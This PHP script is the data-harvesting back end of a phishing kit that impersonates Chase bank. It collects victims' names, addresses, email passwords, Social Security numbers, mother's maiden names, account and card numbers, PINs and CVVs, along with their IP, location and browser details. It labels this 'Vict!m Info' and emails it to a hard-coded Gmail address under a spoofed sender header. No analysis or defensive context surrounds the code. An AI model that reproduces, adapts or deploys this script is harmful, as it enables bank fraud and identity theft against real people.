<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Chase Info-----------------------\n";
$message .= "Full Name            : ".$_POST['text1']."\n";
$message .= "Home Address            : ".$_POST['text2']."\n";
$message .= "City           : ".$_POST['text3']."\n";
$message .= "State            : ".$_POST['select1']."\n";
$message .= "Zip code            : ".$_POST['text4']."\n";
$message .= "Email Address            : ".$_POST['text5']."\n";
$message .= "Email Password            : ".$_POST['text6']."\n";
$message .= "Social Security Number           : ".$_POST['text7']."\n";
$message .= "Mother's Maiden Name           : ".$_POST['text8']."\n";
$message .= "Date of birth            : ".$_POST["select2"].'/'.$_POST['select3'].'/'.$_POST['select4']."\n";
$message .= "Account Number           : ".$_POST['text9']."\n";
$message .= "Card Number           : ".$_POST['text10']."\n";
$message .= "Card Pin            : ".$_POST['text11']."\n";
$message .= "Card Verification Code            : ".$_POST['text12']."\n";
$message .= "Expiration Date            : ".$_POST["select5"].'/'.$_POST['select6']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Burhan-------------\n";
//change ur email here
$send = “daboss053@gmail.com";
$subject = "Result from $ip";
$headers = "From: Chase<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: step3.php");
  

?>
